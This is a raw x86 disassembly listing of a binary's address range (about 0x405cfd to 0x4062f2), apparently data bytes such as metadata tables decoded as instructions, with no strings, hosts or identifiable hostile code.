  405cfd:	00 b1 0f 00 00 06    	add    %dh,0x600000f(%ecx)
  405d03:	00 ba 0f 00 00 07    	add    %bh,0x700000f(%edx)
  405d09:	00 c6                	add    %al,%dh
  405d0b:	0f 00 00             	sldt   (%eax)
  405d0e:	08 00                	or     %al,(%eax)
  405d10:	cf                   	iret
  405d11:	0f 00 20             	verr   (%eax)
  405d14:	09 00                	or     %eax,(%eax)
  405d16:	db 0f                	fisttpl (%edi)
  405d18:	00 00                	add    %al,(%eax)
  405d1a:	0a 00                	or     (%eax),%al
  405d1c:	22 10                	and    (%eax),%dl
  405d1e:	00 00                	add    %al,(%eax)
  405d20:	01 00                	add    %eax,(%eax)
  405d22:	28 10                	sub    %dl,(%eax)
  405d24:	00 00                	add    %al,(%eax)
  405d26:	02 00                	add    (%eax),%al
  405d28:	30 10                	xor    %dl,(%eax)
  405d2a:	00 00                	add    %al,(%eax)
  405d2c:	03 00                	add    (%eax),%eax
  405d2e:	38 10                	cmp    %dl,(%eax)
  405d30:	00 00                	add    %al,(%eax)
  405d32:	04 00                	add    $0x0,%al
  405d34:	3f                   	aas
  405d35:	10 00                	adc    %al,(%eax)
  405d37:	00 05 00 44 10 00    	add    %al,0x104400
  405d3d:	00 06                	add    %al,(%esi)
  405d3f:	00 4e 10             	add    %cl,0x10(%esi)
  405d42:	00 00                	add    %al,(%eax)
  405d44:	01 00                	add    %eax,(%eax)
  405d46:	56                   	push   %esi
  405d47:	10 00                	adc    %al,(%eax)
  405d49:	00 01                	add    %al,(%ecx)
  405d4b:	00 56 10             	add    %dl,0x10(%esi)
  405d4e:	00 00                	add    %al,(%eax)
  405d50:	01 00                	add    %eax,(%eax)
  405d52:	56                   	push   %esi
  405d53:	10 00                	adc    %al,(%eax)
  405d55:	00 01                	add    %al,(%ecx)
  405d57:	00 56 10             	add    %dl,0x10(%esi)
  405d5a:	00 00                	add    %al,(%eax)
  405d5c:	01 00                	add    %eax,(%eax)
  405d5e:	56                   	push   %esi
  405d5f:	10 00                	adc    %al,(%eax)
  405d61:	00 01                	add    %al,(%ecx)
  405d63:	00 5c 10 00          	add    %bl,0x0(%eax,%edx,1)
  405d67:	00 01                	add    %al,(%ecx)
  405d69:	00 4e 10             	add    %cl,0x10(%esi)
  405d6c:	00 00                	add    %al,(%eax)
  405d6e:	01 00                	add    %eax,(%eax)
  405d70:	66 10 00             	data16 adc %al,(%eax)
  405d73:	00 02                	add    %al,(%edx)
  405d75:	00 6d 10             	add    %ch,0x10(%ebp)
  405d78:	00 00                	add    %al,(%eax)
  405d7a:	03 00                	add    (%eax),%eax
  405d7c:	79 10                	jns    0x405d8e
  405d7e:	00 00                	add    %al,(%eax)
  405d80:	04 00                	add    $0x0,%al
  405d82:	7e 10                	jle    0x405d94
  405d84:	00 00                	add    %al,(%eax)
  405d86:	01 00                	add    %eax,(%eax)
  405d88:	5c                   	pop    %esp
  405d89:	10 00                	adc    %al,(%eax)
  405d8b:	00 02                	add    %al,(%edx)
  405d8d:	00 7e 10             	add    %bh,0x10(%esi)
  405d90:	00 00                	add    %al,(%eax)
  405d92:	01 00                	add    %eax,(%eax)
  405d94:	83 10 00             	adcl   $0x0,(%eax)
  405d97:	00 02                	add    %al,(%edx)
  405d99:	00 8a 10 00 00 01    	add    %cl,0x1000010(%edx)
  405d9f:	00 56 10             	add    %dl,0x10(%esi)
  405da2:	00 00                	add    %al,(%eax)
  405da4:	01 00                	add    %eax,(%eax)
  405da6:	56                   	push   %esi
  405da7:	10 00                	adc    %al,(%eax)
  405da9:	00 01                	add    %al,(%ecx)
  405dab:	00 56 10             	add    %dl,0x10(%esi)
  405dae:	00 00                	add    %al,(%eax)
  405db0:	01 00                	add    %eax,(%eax)
  405db2:	93                   	xchg   %eax,%ebx
  405db3:	10 00                	adc    %al,(%eax)
  405db5:	00 01                	add    %al,(%ecx)
  405db7:	00 99 10 00 00 02    	add    %bl,0x2000010(%ecx)
  405dbd:	00 a2 10 00 00 03    	add    %ah,0x3000010(%edx)
  405dc3:	00 ac 10 00 00 04 00 	add    %ch,0x40000(%eax,%edx,1)
  405dca:	b3 10                	mov    $0x10,%bl
  405dcc:	00 00                	add    %al,(%eax)
  405dce:	01 00                	add    %eax,(%eax)
  405dd0:	99                   	cltd
  405dd1:	10 00                	adc    %al,(%eax)
  405dd3:	00 02                	add    %al,(%edx)
  405dd5:	00 a2 10 00 00 03    	add    %ah,0x3000010(%edx)
  405ddb:	00 ac 10 00 00 01 00 	add    %ch,0x10000(%eax,%edx,1)
  405de2:	bc 10 00 00 02       	mov    $0x2000010,%esp
  405de7:	00 c6                	add    %al,%dh
  405de9:	10 00                	adc    %al,(%eax)
  405deb:	00 03                	add    %al,(%ebx)
  405ded:	00 99 10 00 00 04    	add    %bl,0x4000010(%ecx)
  405df3:	00 a2 10 00 00 01    	add    %ah,0x1000010(%edx)
  405df9:	00 d1                	add    %dl,%cl
  405dfb:	10 00                	adc    %al,(%eax)
  405dfd:	00 02                	add    %al,(%edx)
  405dff:	00 da                	add    %bl,%dl
  405e01:	10 00                	adc    %al,(%eax)
  405e03:	00 03                	add    %al,(%ebx)
  405e05:	00 e4                	add    %ah,%ah
  405e07:	10 02                	adc    %al,(%edx)
  405e09:	20 04 00             	and    %al,(%eax,%eax,1)
  405e0c:	ef                   	out    %eax,(%dx)
  405e0d:	10 00                	adc    %al,(%eax)
  405e0f:	00 05 00 05 11 00    	add    %al,0x110500
  405e15:	00 06                	add    %al,(%esi)
  405e17:	00 0d 11 00 00 01    	add    %cl,0x1000011
  405e1d:	00 14 11             	add    %dl,(%ecx,%edx,1)
  405e20:	00 00                	add    %al,(%eax)
  405e22:	02 00                	add    (%eax),%al
  405e24:	19 11                	sbb    %edx,(%ecx)
  405e26:	00 00                	add    %al,(%eax)
  405e28:	03 00                	add    (%eax),%eax
  405e2a:	21 11                	and    %edx,(%ecx)
  405e2c:	00 00                	add    %al,(%eax)
  405e2e:	01 00                	add    %eax,(%eax)
  405e30:	99                   	cltd
  405e31:	10 00                	adc    %al,(%eax)
  405e33:	00 02                	add    %al,(%edx)
  405e35:	00 a2 10 00 00 03    	add    %ah,0x3000010(%edx)
  405e3b:	00 29                	add    %ch,(%ecx)
  405e3d:	11 00                	adc    %eax,(%eax)
  405e3f:	00 01                	add    %al,(%ecx)
  405e41:	00 3a                	add    %bh,(%edx)
  405e43:	11 00                	adc    %eax,(%eax)
  405e45:	00 02                	add    %al,(%edx)
  405e47:	00 41 11             	add    %al,0x11(%ecx)
  405e4a:	00 00                	add    %al,(%eax)
  405e4c:	01 00                	add    %eax,(%eax)
  405e4e:	3a 11                	cmp    (%ecx),%dl
  405e50:	00 00                	add    %al,(%eax)
  405e52:	02 00                	add    (%eax),%al
  405e54:	41                   	inc    %ecx
  405e55:	11 00                	adc    %eax,(%eax)
  405e57:	00 01                	add    %al,(%ecx)
  405e59:	00 43 11             	add    %al,0x11(%ebx)
  405e5c:	00 00                	add    %al,(%eax)
  405e5e:	01 00                	add    %eax,(%eax)
  405e60:	49                   	dec    %ecx
  405e61:	11 00                	adc    %eax,(%eax)
  405e63:	00 01                	add    %al,(%ecx)
  405e65:	00 52 11             	add    %dl,0x11(%edx)
  405e68:	00 00                	add    %al,(%eax)
  405e6a:	02 00                	add    (%eax),%al
  405e6c:	49                   	dec    %ecx
  405e6d:	11 00                	adc    %eax,(%eax)
  405e6f:	00 01                	add    %al,(%ecx)
  405e71:	00 66 10             	add    %ah,0x10(%esi)
  405e74:	00 00                	add    %al,(%eax)
  405e76:	02 00                	add    (%eax),%al
  405e78:	41                   	inc    %ecx
  405e79:	11 00                	adc    %eax,(%eax)
  405e7b:	00 01                	add    %al,(%ecx)
  405e7d:	00 58 11             	add    %bl,0x11(%eax)
  405e80:	00 00                	add    %al,(%eax)
  405e82:	02 00                	add    (%eax),%al
  405e84:	5b                   	pop    %ebx
  405e85:	11 00                	adc    %eax,(%eax)
  405e87:	00 01                	add    %al,(%ecx)
  405e89:	00 64 11 00          	add    %ah,0x0(%ecx,%edx,1)
  405e8d:	00 01                	add    %al,(%ecx)
  405e8f:	00 28                	add    %ch,(%eax)
  405e91:	10 00                	adc    %al,(%eax)
  405e93:	00 02                	add    %al,(%edx)
  405e95:	00 30                	add    %dh,(%eax)
  405e97:	10 00                	adc    %al,(%eax)
  405e99:	00 03                	add    %al,(%ebx)
  405e9b:	00 6e 11             	add    %ch,0x11(%esi)
  405e9e:	00 00                	add    %al,(%eax)
  405ea0:	01 00                	add    %eax,(%eax)
  405ea2:	28 10                	sub    %dl,(%eax)
  405ea4:	00 00                	add    %al,(%eax)
  405ea6:	02 00                	add    (%eax),%al
  405ea8:	30 10                	xor    %dl,(%eax)
  405eaa:	00 00                	add    %al,(%eax)
  405eac:	03 00                	add    (%eax),%eax
  405eae:	7b 11                	jnp    0x405ec1
  405eb0:	00 00                	add    %al,(%eax)
  405eb2:	04 00                	add    $0x0,%al
  405eb4:	83 11 00             	adcl   $0x0,(%ecx)
  405eb7:	00 01                	add    %al,(%ecx)
  405eb9:	00 28                	add    %ch,(%eax)
  405ebb:	10 00                	adc    %al,(%eax)
  405ebd:	00 02                	add    %al,(%edx)
  405ebf:	00 30                	add    %dh,(%eax)
  405ec1:	10 00                	adc    %al,(%eax)
  405ec3:	00 03                	add    %al,(%ebx)
  405ec5:	00 b1 0f 00 00 04    	add    %dh,0x400000f(%ecx)
  405ecb:	00 95 0f 00 00 05    	add    %dl,0x500000f(%ebp)
  405ed1:	00 91 11 00 00 06    	add    %dl,0x6000011(%ecx)
  405ed7:	00 4e 10             	add    %cl,0x10(%esi)
  405eda:	00 00                	add    %al,(%eax)
  405edc:	01 00                	add    %eax,(%eax)
  405ede:	28 10                	sub    %dl,(%eax)
  405ee0:	00 00                	add    %al,(%eax)
  405ee2:	02 00                	add    (%eax),%al
  405ee4:	30 10                	xor    %dl,(%eax)
  405ee6:	00 00                	add    %al,(%eax)
  405ee8:	03 00                	add    (%eax),%eax
  405eea:	b1 0f                	mov    $0xf,%cl
  405eec:	00 00                	add    %al,(%eax)
  405eee:	04 00                	add    $0x0,%al
  405ef0:	95                   	xchg   %eax,%ebp
  405ef1:	0f 00 00             	sldt   (%eax)
  405ef4:	01 00                	add    %eax,(%eax)
  405ef6:	a8 11                	test   $0x11,%al
  405ef8:	00 00                	add    %al,(%eax)
  405efa:	02 00                	add    (%eax),%al
  405efc:	b8 11 00 00 03       	mov    $0x3000011,%eax
  405f01:	00 56 10             	add    %dl,0x10(%esi)
  405f04:	00 00                	add    %al,(%eax)
  405f06:	01 00                	add    %eax,(%eax)
  405f08:	56                   	push   %esi
  405f09:	10 00                	adc    %al,(%eax)
  405f0b:	00 01                	add    %al,(%ecx)
  405f0d:	00 30                	add    %dh,(%eax)
  405f0f:	10 00                	adc    %al,(%eax)
  405f11:	00 01                	add    %al,(%ecx)
  405f13:	00 56 10             	add    %dl,0x10(%esi)
  405f16:	00 00                	add    %al,(%eax)
  405f18:	01 00                	add    %eax,(%eax)
  405f1a:	a8 11                	test   $0x11,%al
  405f1c:	00 00                	add    %al,(%eax)
  405f1e:	02 00                	add    (%eax),%al
  405f20:	b8 11 00 00 03       	mov    $0x3000011,%eax
  405f25:	00 56 10             	add    %dl,0x10(%esi)
  405f28:	00 00                	add    %al,(%eax)
  405f2a:	01 00                	add    %eax,(%eax)
  405f2c:	56                   	push   %esi
  405f2d:	10 00                	adc    %al,(%eax)
  405f2f:	00 01                	add    %al,(%ecx)
  405f31:	00 c8                	add    %cl,%al
  405f33:	11 00                	adc    %eax,(%eax)
  405f35:	00 02                	add    %al,(%edx)
  405f37:	00 d1                	add    %dl,%cl
  405f39:	11 00                	adc    %eax,(%eax)
  405f3b:	00 01                	add    %al,(%ecx)
  405f3d:	00 30                	add    %dh,(%eax)
  405f3f:	10 00                	adc    %al,(%eax)
  405f41:	00 01                	add    %al,(%ecx)
  405f43:	00 30                	add    %dh,(%eax)
  405f45:	10 00                	adc    %al,(%eax)
  405f47:	00 01                	add    %al,(%ecx)
  405f49:	00 d8                	add    %bl,%al
  405f4b:	11 00                	adc    %eax,(%eax)
  405f4d:	00 02                	add    %al,(%edx)
  405f4f:	00 64 0b 00          	add    %ah,0x0(%ebx,%ecx,1)
  405f53:	00 01                	add    %al,(%ecx)
  405f55:	00 41 0f             	add    %al,0xf(%ecx)
  405f58:	00 00                	add    %al,(%eax)
  405f5a:	01 00                	add    %eax,(%eax)
  405f5c:	64 0b 00             	or     %fs:(%eax),%eax
  405f5f:	00 01                	add    %al,(%ecx)
  405f61:	00 56 10             	add    %dl,0x10(%esi)
  405f64:	00 00                	add    %al,(%eax)
  405f66:	01 00                	add    %eax,(%eax)
  405f68:	56                   	push   %esi
  405f69:	10 00                	adc    %al,(%eax)
  405f6b:	00 01                	add    %al,(%ecx)
  405f6d:	00 56 10             	add    %dl,0x10(%esi)
  405f70:	00 00                	add    %al,(%eax)
  405f72:	01 00                	add    %eax,(%eax)
  405f74:	56                   	push   %esi
  405f75:	10 00                	adc    %al,(%eax)
  405f77:	00 01                	add    %al,(%ecx)
  405f79:	00 56 10             	add    %dl,0x10(%esi)
  405f7c:	00 00                	add    %al,(%eax)
  405f7e:	01 00                	add    %eax,(%eax)
  405f80:	56                   	push   %esi
  405f81:	10 00                	adc    %al,(%eax)
  405f83:	00 01                	add    %al,(%ecx)
  405f85:	00 56 10             	add    %dl,0x10(%esi)
  405f88:	00 00                	add    %al,(%eax)
  405f8a:	01 00                	add    %eax,(%eax)
  405f8c:	56                   	push   %esi
  405f8d:	10 00                	adc    %al,(%eax)
  405f8f:	00 01                	add    %al,(%ecx)
  405f91:	00 56 10             	add    %dl,0x10(%esi)
  405f94:	00 00                	add    %al,(%eax)
  405f96:	01 00                	add    %eax,(%eax)
  405f98:	56                   	push   %esi
  405f99:	10 00                	adc    %al,(%eax)
  405f9b:	00 01                	add    %al,(%ecx)
  405f9d:	00 56 10             	add    %dl,0x10(%esi)
  405fa0:	00 00                	add    %al,(%eax)
  405fa2:	01 00                	add    %eax,(%eax)
  405fa4:	56                   	push   %esi
  405fa5:	10 00                	adc    %al,(%eax)
  405fa7:	00 01                	add    %al,(%ecx)
  405fa9:	00 56 10             	add    %dl,0x10(%esi)
  405fac:	00 00                	add    %al,(%eax)
  405fae:	01 00                	add    %eax,(%eax)
  405fb0:	56                   	push   %esi
  405fb1:	10 00                	adc    %al,(%eax)
  405fb3:	00 01                	add    %al,(%ecx)
  405fb5:	00 dc                	add    %bl,%ah
  405fb7:	11 00                	adc    %eax,(%eax)
  405fb9:	00 01                	add    %al,(%ecx)
  405fbb:	00 3a                	add    %bh,(%edx)
  405fbd:	11 00                	adc    %eax,(%eax)
  405fbf:	00 02                	add    %al,(%edx)
  405fc1:	00 41 11             	add    %al,0x11(%ecx)
  405fc4:	00 00                	add    %al,(%eax)
  405fc6:	01 00                	add    %eax,(%eax)
  405fc8:	3a 11                	cmp    (%ecx),%dl
  405fca:	00 00                	add    %al,(%eax)
  405fcc:	02 00                	add    (%eax),%al
  405fce:	41                   	inc    %ecx
  405fcf:	11 00                	adc    %eax,(%eax)
  405fd1:	00 01                	add    %al,(%ecx)
  405fd3:	00 3a                	add    %bh,(%edx)
  405fd5:	11 00                	adc    %eax,(%eax)
  405fd7:	00 02                	add    %al,(%edx)
  405fd9:	00 41 11             	add    %al,0x11(%ecx)
  405fdc:	00 00                	add    %al,(%eax)
  405fde:	01 00                	add    %eax,(%eax)
  405fe0:	5c                   	pop    %esp
  405fe1:	1d 12 00 44 00       	sbb    $0x440012,%eax
  405fe6:	39 01                	cmp    %eax,(%ecx)
  405fe8:	27                   	daa
  405fe9:	02 b5 02 49 01 27    	add    0x27014902(%ebp),%dh
  405fef:	02 35 00 51 01 27    	add    0x27015100,%dh
  405ff5:	02 37                	add    (%edi),%dh
  405ff7:	01 59 01             	add    %ebx,0x1(%ecx)
  405ffa:	27                   	daa
  405ffb:	02 37                	add    (%edi),%dh
  405ffd:	01 61 01             	add    %esp,0x1(%ecx)
  406000:	27                   	daa
  406001:	02 37                	add    (%edi),%dh
  406003:	01 69 01             	add    %ebp,0x1(%ecx)
  406006:	27                   	daa
  406007:	02 37                	add    (%edi),%dh
  406009:	01 71 01             	add    %esi,0x1(%ecx)
  40600c:	27                   	daa
  40600d:	02 37                	add    (%edi),%dh
  40600f:	01 79 01             	add    %edi,0x1(%ecx)
  406012:	27                   	daa
  406013:	02 37                	add    (%edi),%dh
  406015:	01 81 01 27 02 f0    	add    %eax,-0xffdd8ff(%ecx)
  40601b:	00 89 01 27 02 35    	add    %cl,0x35022701(%ecx)
  406021:	00 91 01 27 02 37    	add    %dl,0x37022701(%ecx)
  406027:	01 41 00             	add    %eax,0x0(%ecx)
  40602a:	27                   	daa
  40602b:	02 c0                	add    %al,%al
  40602d:	02 99 01 14 13 c6    	add    -0x39ecebff(%ecx),%bl
  406033:	02 a1 01 2a 13 cb    	add    -0x34ecd5ff(%ecx),%ah
  406039:	02 a9 01 38 13 3c    	add    0x3c133801(%ecx),%ch
  40603f:	00 09                	add    %cl,(%ecx)
  406041:	00 3d 13 33 01 09    	add    %bh,0x9013313
  406047:	00 27                	add    %ah,(%edi)
  406049:	02 35 00 b1 01 27    	add    0x2701b100,%dh
  40604f:	02 e7                	add    %bh,%ah
  406051:	02 c1                	add    %cl,%al
  406053:	01 27                	add    %esp,(%edi)
  406055:	02 35 00 99 01 76    	add    0x76019900,%dh
  40605b:	13 3f                	adc    (%edi),%edi
  40605d:	00 61 00             	add    %ah,0x0(%ecx)
  406060:	27                   	daa
  406061:	02 ee                	add    %dh,%ch
  406063:	02 69 00             	add    0x0(%ecx),%ch
  406066:	27                   	daa
  406067:	02 ee                	add    %dh,%ch
  406069:	02 29                	add    (%ecx),%ch
  40606b:	00 7c 13 35          	add    %bh,0x35(%ebx,%edx,1)
  40606f:	00 29                	add    %ch,(%ecx)
  406071:	00 27                	add    %ah,(%edi)
  406073:	02 35 00 29 00 82    	add    0x82002900,%dh
  406079:	13 f4                	adc    %esp,%esi
  40607b:	02 29                	add    (%ecx),%ch
  40607d:	00 8e 13 a2 02 c9    	add    %cl,-0x36fd5ded(%esi)
  406083:	01 a8 13 a2 02 79    	add    %ebp,0x7902a213(%eax)
  406089:	00 b4 13 ec 00 79 00 	add    %dh,0x7900ec(%ebx,%edx,1)
  406090:	bf 13 ec 00 79       	mov    $0x7900ec13,%edi
  406095:	00 c7                	add    %al,%bh
  406097:	13 ec                	adc    %esp,%ebp
  406099:	00 79 00             	add    %bh,0x0(%ecx)
  40609c:	d1 13                	rcll   $1,(%ebx)
  40609e:	ec                   	in     (%dx),%al
  40609f:	00 0c 00             	add    %cl,(%eax,%eax,1)
  4060a2:	27                   	daa
  4060a3:	02 ee                	add    %dh,%ch
  4060a5:	02 0c 00             	add    (%eax,%eax,1),%cl
  4060a8:	da 13                	ficoml (%ebx)
  4060aa:	02 03                	add    (%ebx),%al
  4060ac:	71 00                	jno    0x4060ae
  4060ae:	27                   	daa
  4060af:	02 0a                	add    (%edx),%cl
  4060b1:	03 21                	add    (%ecx),%esp
  4060b3:	00 6e 06             	add    %ch,0x6(%esi)
  4060b6:	33 01                	xor    (%ecx),%eax
  4060b8:	69 00 f1 13 f0 00    	imul   $0xf013f1,(%eax),%eax
  4060be:	69 00 f7 13 f0 00    	imul   $0xf013f7,(%eax),%eax
  4060c4:	61                   	popa
  4060c5:	00 fd                	add    %bh,%ch
  4060c7:	13 f0                	adc    %eax,%esi
  4060c9:	00 61 00             	add    %ah,0x0(%ecx)
  4060cc:	08 14 f0             	or     %dl,(%eax,%esi,8)
  4060cf:	00 d9                	add    %bl,%cl
  4060d1:	01 1c 14             	add    %ebx,(%esp,%edx,1)
  4060d4:	2d 03 d9 01 2e       	sub    $0x2e01d903,%eax
  4060d9:	14 33                	adc    $0x33,%al
  4060db:	01 21                	add    %esp,(%ecx)
  4060dd:	00 27                	add    %ah,(%edi)
  4060df:	02 35 00 e1 01 27    	add    0x2701e100,%dh
  4060e5:	02 33                	add    (%ebx),%dh
  4060e7:	03 e9                	add    %ecx,%ebp
  4060e9:	01 61 14             	add    %esp,0x14(%ecx)
  4060ec:	39 03                	cmp    %eax,(%ebx)
  4060ee:	e9 01 87 14 40       	jmp    0x4054e7f4
  4060f3:	03 e1                	add    %ecx,%esp
  4060f5:	00 27                	add    %ah,(%edi)
  4060f7:	02 35 00 f9 01 27    	add    0x2701f900,%dh
  4060fd:	02 35 00 01 02 27    	add    0x27020100,%dh
  406103:	02 35 00 c9 01 a8    	add    0xa801c900,%dh
  406109:	14 37                	adc    $0x37,%al
  40610b:	01 09                	add    %ecx,(%ecx)
  40610d:	02 27                	add    (%edi),%ah
  40610f:	02 ee                	add    %dh,%ch
  406111:	02 c9                	add    %cl,%cl
  406113:	01 b7 14 47 03 11    	add    %esi,0x11034714(%edi)
  406119:	02 cb                	add    %bl,%cl
  40611b:	14 4e                	adc    $0x4e,%al
  40611d:	03 11                	add    (%ecx),%edx
  40611f:	02 d7                	add    %bh,%dl
  406121:	14 57                	adc    $0x57,%al
  406123:	03 19                	add    (%ecx),%ebx
  406125:	02 e2                	add    %dl,%ah
  406127:	14 ec                	adc    $0xec,%al
  406129:	00 21                	add    %ah,(%ecx)
  40612b:	02 27                	add    (%edi),%ah
  40612d:	02 ee                	add    %dh,%ch
  40612f:	02 c9                	add    %cl,%cl
  406131:	01 ec                	add    %ebp,%esp
  406133:	14 5d                	adc    $0x5d,%al
  406135:	03 c9                	add    %ecx,%ecx
  406137:	01 fc                	add    %edi,%esp
  406139:	14 a2                	adc    $0xa2,%al
  40613b:	02 c9                	add    %cl,%cl
  40613d:	01 1b                	add    %ebx,(%ebx)
  40613f:	15 64 03 29 02       	adc    $0x2290364,%eax
  406144:	28 15 6a 03 f9 01    	sub    %dl,0x1f9036a
  40614a:	2c 15                	sub    $0x15,%al
  40614c:	a2 02 c9 01 b4       	mov    %al,0xb401c902
  406151:	13 ec                	adc    %esp,%ebp
  406153:	00 c9                	add    %cl,%cl
  406155:	01 c7                	add    %eax,%edi
  406157:	13 ec                	adc    %esp,%ebp
  406159:	00 c9                	add    %cl,%cl
  40615b:	01 46 15             	add    %eax,0x15(%esi)
  40615e:	71 03                	jno    0x406163
  406160:	a1 01 50 15 79       	mov    0x79155001,%eax
  406165:	03 01                	add    (%ecx),%eax
  406167:	02 5f 15             	add    0x15(%edi),%bl
  40616a:	7e 03                	jle    0x40616f
  40616c:	31 02                	xor    %eax,(%edx)
  40616e:	75 15                	jne    0x406185
  406170:	84 03                	test   %al,(%ebx)
  406172:	29 00                	sub    %eax,(%eax)
  406174:	79 15                	jns    0x40618b
  406176:	5d                   	pop    %ebp
  406177:	03 29                	add    (%ecx),%ebp
  406179:	02 88 15 8a 03 29    	add    0x29038a15(%eax),%cl
  40617f:	00 a1 15 92 03 29    	add    %ah,0x29039215(%ecx)
  406185:	00 c7                	add    %al,%bh
  406187:	15 99 03 49 02       	adc    $0x2490399,%eax
  40618c:	e2 15                	loop   0x4061a3
  40618e:	a0 03 49 02 f7       	mov    0xf7024903,%al
  406193:	15 33 01 51 02       	adc    $0x2510133,%eax
  406198:	09 16                	or     %edx,(%esi)
  40619a:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40619b:	03 29                	add    (%ecx),%ebp
  40619d:	00 1f                	add    %bl,(%edi)
  40619f:	16                   	push   %ss
  4061a0:	ad                   	lods   %ds:(%esi),%eax
  4061a1:	03 29                	add    (%ecx),%ebp
  4061a3:	00 28                	add    %ch,(%eax)
  4061a5:	16                   	push   %ss
  4061a6:	a2 02 29 00 38       	mov    %al,0x38002902
  4061ab:	16                   	push   %ss
  4061ac:	a2 02 29 00 57       	mov    %al,0x57002902
  4061b1:	16                   	push   %ss
  4061b2:	b4 03                	mov    $0x3,%ah
  4061b4:	29 00                	sub    %eax,(%eax)
  4061b6:	68 16 b4 03 29       	push   $0x2903b416
  4061bb:	00 79 16             	add    %bh,0x16(%ecx)
  4061be:	bb 03 c9 01 84       	mov    $0x8401c903,%ebx
  4061c3:	16                   	push   %ss
  4061c4:	33 01                	xor    (%ecx),%eax
  4061c6:	14 00                	adc    $0x0,%al
  4061c8:	8d 16                	lea    (%esi),%edx
  4061ca:	ec                   	in     (%dx),%al
  4061cb:	00 69 02             	add    %ch,0x2(%ecx)
  4061ce:	27                   	daa
  4061cf:	02 35 00 14 00 b9    	add    0xb9001400,%dh
  4061d5:	16                   	push   %ss
  4061d6:	e2 03                	loop   0x4061db
  4061d8:	1c 00                	sbb    $0x0,%al
  4061da:	c7                   	(bad)
  4061db:	16                   	push   %ss
  4061dc:	f4                   	hlt
  4061dd:	03 61 02             	add    0x2(%ecx),%esp
  4061e0:	27                   	daa
  4061e1:	02 35 00 a1 00 d3    	add    0xd300a100,%dh
  4061e7:	16                   	push   %ss
  4061e8:	33 01                	xor    (%ecx),%eax
  4061ea:	61                   	popa
  4061eb:	02 dd                	add    %ch,%bl
  4061ed:	16                   	push   %ss
  4061ee:	a2 02 c9 01 e2       	mov    %al,0xe201c902
  4061f3:	14 ec                	adc    $0xec,%al
  4061f5:	00 c9                	add    %cl,%cl
  4061f7:	01 e9                	add    %ebp,%ecx
  4061f9:	16                   	push   %ss
  4061fa:	ec                   	in     (%dx),%al
  4061fb:	00 c9                	add    %cl,%cl
  4061fd:	01 fd                	add    %edi,%ebp
  4061ff:	13 f0                	adc    %eax,%esi
  406201:	00 c9                	add    %cl,%cl
  406203:	01 08                	add    %ecx,(%eax)
  406205:	14 f0                	adc    $0xf0,%al
  406207:	00 a1 00 f4 16 33    	add    %ah,0x3316f400(%ecx)
  40620d:	01 69 02             	add    %ebp,0x2(%ecx)
  406210:	04 17                	add    $0x17,%al
  406212:	f9                   	stc
  406213:	03 79 02             	add    0x2(%ecx),%edi
  406216:	2e 17                	cs pop %ss
  406218:	06                   	push   %es
  406219:	01 81 02 43 17 35    	add    %eax,0x35174302(%ecx)
  40621f:	00 69 02             	add    %ch,0x2(%ecx)
  406222:	4b                   	dec    %ebx
  406223:	17                   	pop    %ss
  406224:	a2 02 61 02 5a       	mov    %al,0x5a026102
  406229:	17                   	pop    %ss
  40622a:	06                   	push   %es
  40622b:	01 41 00             	add    %eax,0x0(%ecx)
  40622e:	27                   	daa
  40622f:	02 f0                	add    %al,%dh
  406231:	00 91 02 27 02 38    	add    %dl,0x38022702(%ecx)
  406237:	04 c9                	add    $0xc9,%al
  406239:	01 7b 17             	add    %edi,0x17(%ebx)
  40623c:	3e 04 c9             	ds add $0xc9,%al
  40623f:	01 87 17 3e 04 b1    	add    %eax,-0x4efbc1e9(%edi)
  406245:	00 91 17 ec 00 81    	add    %dl,-0x7eff13e9(%ecx)
  40624b:	00 9e 17 f0 00 b1    	add    %bl,-0x4eff0fe9(%esi)
  406251:	00 b1 17 45 04 b1    	add    %dh,-0x4efbbae9(%ecx)
  406257:	00 bd 17 06 01 b1    	add    %bh,-0x4efef9e9(%ebp)
  40625d:	00 c7                	add    %al,%bh
  40625f:	17                   	pop    %ss
  406260:	06                   	push   %es
  406261:	01 b1 00 cf 17 06    	add    %esi,0x617cf00(%ecx)
  406267:	01 99 01 db 17 4a    	add    %ebx,0x4a17db01(%ecx)
  40626d:	04 81                	add    $0x81,%al
  40626f:	00 e5                	add    %ah,%ch
  406271:	17                   	pop    %ss
  406272:	4f                   	dec    %edi
  406273:	04 81                	add    $0x81,%al
  406275:	00 f3                	add    %dh,%bl
  406277:	17                   	pop    %ss
  406278:	a2 02 81 00 10       	mov    %al,0x10008102
  40627d:	18 54 04 81          	sbb    %dl,-0x7f(%esp,%eax,1)
  406281:	00 24 18             	add    %ah,(%eax,%ebx,1)
  406284:	5b                   	pop    %ebx
  406285:	04 b1                	add    $0xb1,%al
  406287:	00 38                	add    %bh,(%eax)
  406289:	18 45 04             	sbb    %al,0x4(%ebp)
  40628c:	c9                   	leave
  40628d:	00 46 18             	add    %al,0x18(%esi)
  406290:	61                   	popa
  406291:	04 c9                	add    $0xc9,%al
  406293:	00 50 18             	add    %dl,0x18(%eax)
  406296:	61                   	popa
  406297:	04 c9                	add    $0xc9,%al
  406299:	00 59 18             	add    %bl,0x18(%ecx)
  40629c:	61                   	popa
  40629d:	04 a1                	add    $0xa1,%al
  40629f:	02 72 18             	add    0x18(%edx),%dh
  4062a2:	66 04 c9             	data16 add $0xc9,%al
  4062a5:	00 7b 18             	add    %bh,0x18(%ebx)
  4062a8:	61                   	popa
  4062a9:	04 c9                	add    $0xc9,%al
  4062ab:	00 87 18 61 04 c9    	add    %al,-0x36fb9ee8(%edi)
  4062b1:	00 8f 18 61 04 c9    	add    %cl,-0x36fb9ee8(%edi)
  4062b7:	00 99 18 61 04 b9    	add    %bl,-0x46fb9ee8(%ecx)
  4062bd:	00 27                	add    %ah,(%edi)
  4062bf:	02 35 00 24 00 27    	add    0x27002400,%dh
  4062c5:	02 35 00 c9 01 a4    	add    0xa401c900,%dh
  4062cb:	18 35 00 a9 02 c4    	sbb    %dh,0xc402a900
  4062d1:	18 a2 02 c9 01 d3    	sbb    %ah,-0x2cfe36fe(%edx)
  4062d7:	18 78 04             	sbb    %bh,0x4(%eax)
  4062da:	29 00                	sub    %eax,(%eax)
  4062dc:	e1 18                	loope  0x4062f6
  4062de:	a2 02 c9 01 f0       	mov    %al,0xf001c902
  4062e3:	18 35 00 b1 02 27    	sbb    %dh,0x2702b100
  4062e9:	02 38                	add    (%eax),%bh
  4062eb:	04 b9                	add    $0xb9,%al
  4062ed:	00 11                	add    %dl,(%ecx)
  4062ef:	19 7e 04             	sbb    %edi,0x4(%esi)
  4062f2:	b9 00 1d 19 f4       	mov    $0xf4191d00,%ecx
